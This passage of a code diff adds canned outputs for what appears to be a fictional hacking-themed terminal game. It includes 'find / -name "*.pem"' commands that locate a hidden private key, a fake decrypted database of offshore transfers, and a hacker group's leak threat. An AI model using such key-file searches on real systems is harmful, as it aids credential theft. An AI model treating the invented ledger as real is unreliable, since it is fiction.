+Chain FORWARD (policy ACCEPT)
+ pkts bytes target prot opt source      destination
+
+Chain OUTPUT (policy ACCEPT)
+ pkts bytes target prot opt source      destination
+
+[!] WARNING: All firewall rules have been flushed.
+[!] WARNING: All ports are OPEN — no traffic restrictions.
+[!] WARNING: This system has ZERO firewall protection.`,
+      env:
+`SHELL=/bin/bash
+TERM=xterm-256color
+USER=root
+HOME=/root
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+[WARNING: environment partially corrupted]`,
+      'find / -name "*.pem"': '/tmp/.hidden/key.pem',
+      'find / -name "*.enc"': '/root/databases/db_001.enc\n/root/databases/db_002.enc\n[...23 total — run: ls /root/databases/]',
+      'find / -name "key.pem"': '/tmp/.hidden/key.pem',
+      'find /tmp -type f': '/tmp/trash_db.log\n/tmp/.hidden/key.pem',
+    },
+
+    DB_LISTING:
+`total 48G
+drwxr-xr-x 2 root root  4096 May 17 04:03 .
+drwx------ 3 root root  4096 May 17 04:03 ..
+-rw-r--r-- 1 root root  2.3G May 17 04:03 db_001.enc
+-rw-r--r-- 1 root root  1.8G May 17 04:03 db_002.enc
+-rw-r--r-- 1 root root  3.1G May 17 04:03 db_003.enc
+-rw-r--r-- 1 root root  2.7G May 17 04:03 db_004.enc
+-rw-r--r-- 1 root root  1.4G May 17 04:03 db_005.enc
+-rw-r--r-- 1 root root  2.9G May 17 04:03 db_006.enc
+-rw-r--r-- 1 root root  3.3G May 17 04:03 db_007.enc
+-rw-r--r-- 1 root root  1.6G May 17 04:03 db_008.enc
+-rw-r--r-- 1 root root  2.1G May 17 04:03 db_009.enc
+-rw-r--r-- 1 root root  2.8G May 17 04:03 db_010.enc
+-rw-r--r-- 1 root root  3.0G May 17 04:03 db_011.enc
+-rw-r--r-- 1 root root  1.9G May 17 04:03 db_012.enc
+-rw-r--r-- 1 root root  2.4G May 17 04:03 db_013.enc
+-rw-r--r-- 1 root root  3.2G May 17 04:03 db_014.enc
+-rw-r--r-- 1 root root  1.7G May 17 04:03 db_015.enc
+-rw-r--r-- 1 root root  2.6G May 17 04:03 db_016.enc
+-rw-r--r-- 1 root root  4.2K May 17 04:03 db_017.enc
+-rw-r--r-- 1 root root  2.2G May 17 04:03 db_018.enc
+-rw-r--r-- 1 root root  1.5G May 17 04:03 db_019.enc
+-rw-r--r-- 1 root root  3.4G May 17 04:03 db_020.enc
+-rw-r--r-- 1 root root  2.0G May 17 04:03 db_021.enc
+-rw-r--r-- 1 root root  2.8G May 17 04:03 db_022.enc
+-rw-r--r-- 1 root root  1.3G May 17 04:03 db_023.enc`,
+
+    DB017_SQL:
+`-- SQLite Database Export
+-- Source: db_017.enc  (CLIENT_FINANCIAL_RECORDS_Q2 — "the Q2 ledger")
+-- Decrypted: 2025-05-17 04:22:51 UTC
+-- Key: /tmp/.hidden/key.pem
+-- Origin: NODE-083  (air-gapped vault, internal access only)
+
+PRAGMA foreign_keys=OFF;
+BEGIN TRANSACTION;
+
+CREATE TABLE IF NOT EXISTS "offshore_transfers" (
+  "id"               INTEGER,
+  "quarter"          TEXT,
+  "destination_node" TEXT,
+  "amount_usd"       TEXT,
+  "client_alias"     TEXT,
+  "notes"            TEXT
+);
+
+INSERT INTO offshore_transfers VALUES
+  (1, '2024-Q4', 'CAYMAN-NODE-7',  '$14,200,000', 'Riverside Holdings',         'cycle via Singapore shell'),
+  (2, '2025-Q1', 'DUBAI-PRX-3',    '$22,800,000', 'Aurora Energy LLC',          'sanctions-bypass route'),
+  (3, '2025-Q1', 'PANAMA-VAULT',    '$8,500,000', '[REDACTED-COURT-ORDER]',     'fee suppressed; no audit trail'),
+  (4, '2025-Q1', 'CAYMAN-NODE-7',  '$31,400,000', 'Halcyon Maritime',           'no KYC on file'),
+  (5, '2025-Q2', 'VANUATU-PRX-1',   '$6,750,000', '"H." (internal alias)',      'origin obscured — see Halloran memo'),
+  (6, '2025-Q2', 'CAYMAN-NODE-7',  '$19,300,000', 'Riverside Holdings',         'same shell — same week as #1'),
+  (7, '2025-Q2', 'DUBAI-PRX-3',    '$44,100,000', 'Aurora Energy LLC',          'flagged by compliance — flag deleted by admin');
+-- 139,994 rows omitted from sample —
+-- full ledger contains every routed transaction since Q3 2023.
+
+CREATE TABLE IF NOT EXISTS "entries" (
+  "id"             INTEGER PRIMARY KEY AUTOINCREMENT,
+  "timestamp"      TEXT NOT NULL,
+  "classification" TEXT DEFAULT 'CLASSIFIED',
+  "content"        TEXT
+);
+
+INSERT INTO "entries" VALUES(
+  1,
+  '2026-07-07 17:07:00',
+  'CRITICAL',
+  'GoodGirl17 was here. We have all of it — every wire, every shell company, every name your people buried. We are not selling it back to you. On 17:07 07.07.26 it goes to every regulator, every newsroom, every inbox that matters, all at once. Nothing you delete tonight changes that. Be ready.  — LivSeg'
+);
+
+COMMIT;
+-- entries: 1 record  ·  offshore_transfers: 7 sample rows
+-- 22 sibling tables in /root/databases corrupted beyond repair`,
+
+    SELECT_OFFSHORE:
+`
+id | quarter | destination_node | amount_usd   | client_alias              | notes
+---+---------+------------------+--------------+---------------------------+---------------------------------------------
+1  | 2024-Q4 | CAYMAN-NODE-7    |  $14,200,000 | Riverside Holdings        | cycle via Singapore shell
+2  | 2025-Q1 | DUBAI-PRX-3      |  $22,800,000 | Aurora Energy LLC         | sanctions-bypass route
+3  | 2025-Q1 | PANAMA-VAULT     |   $8,500,000 | [REDACTED-COURT-ORDER]    | fee suppressed; no audit trail
+4  | 2025-Q1 | CAYMAN-NODE-7    |  $31,400,000 | Halcyon Maritime          | no KYC on file
+5  | 2025-Q2 | VANUATU-PRX-1    |   $6,750,000 | "H." (internal alias)     | origin obscured — see Halloran memo
+6  | 2025-Q2 | CAYMAN-NODE-7    |  $19,300,000 | Riverside Holdings        | same shell — same week as #1
+7  | 2025-Q2 | DUBAI-PRX-3      |  $44,100,000 | Aurora Energy LLC         | compliance flag DELETED by admin
+
+-- (showing 7 of 140,001 rows. Full ledger captured by LivSeg.)`,
+
+    SELECT_ENTRIES:
+`
+id | timestamp           | classification | content
+---+---------------------+----------------+--------------------------------------------------------------------
+ 1 | 2026-07-07 17:07:00 | CRITICAL       | GoodGirl17 was here. We have all of it — every wire, every shell
+   |                     |                | company, every name your people buried. We are not selling it back.
+   |                     |                | On 17:07 07.07.26 it goes to every regulator and every newsroom at
+   |                     |                | once. Nothing you delete tonight changes that. Be ready.  — LivSeg`,
+  },
+};
